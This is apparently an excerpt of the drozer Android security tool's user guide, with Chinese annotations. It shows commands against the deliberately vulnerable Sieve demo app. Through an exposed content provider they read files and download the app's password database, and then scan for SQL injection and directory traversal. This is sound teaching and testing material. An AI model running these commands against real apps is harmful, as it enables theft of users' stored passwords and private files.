# 下载位置
1. [软件下载 & 用户指南](https://labs.mwrinfosecurity.com/tools/drozer/)
2. [drozer-GitHub](https://github.com/mwrlabs/drozer)
    - [apk 下载 -> 点击 here](https://github.com/mwrlabs/drozer#usage)

# 用户指南

### 3.5.3 File System-backed Content Providers [Content Provider 文件系统：通过 ContentProvider 访问文件]
A content provider can provide access to the underlying file system. This allows apps to share files, where the
Android sandbox would otherwise prevent it.
Since we can reasonably assume that FileBackupProvider is a file system-backed content provider and that the
path component represents the location of the file we want to open, we can easily guess the content URIs for
this and use a drozer module to read the files:
```terminal
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1 localhost
```
Reading the /etc/hosts file is not a big problem (it is world readable anyway) but having discovered the path to
the application’s data directory in Section 3.2 we can go after more sensitive information:
```terminal
dz> run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data
/data/com.mwr.example.sieve/databases/database.db /home/user/database.db
UNRESTRICTED EXTERNAL
mwrinfosecurity.com | © MWR InfoSecurity
UNRESTRICTED EXTERNAL
16
Written 24576 bytes
```
This has copied the application’s database from the device to the local machine, where it can be browsed with
sqlite to extract not only the user’s encrypted passwords, but also their master password.

### 3.5.4 Content Provider Vulnerabilities  [Content provider 脆弱性]
We have seen that content providers can be vulnerable to both SQL injection and directory traversal. drozer
offers modules to automatically test for simple cases of these vulnerabilities:

我们已经看到 content provider 可以被 SQL 注入和目录遍历。drozer 提供了一个简单的自动测试这些脆弱性的模块，使用方式如下：
```terminal
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```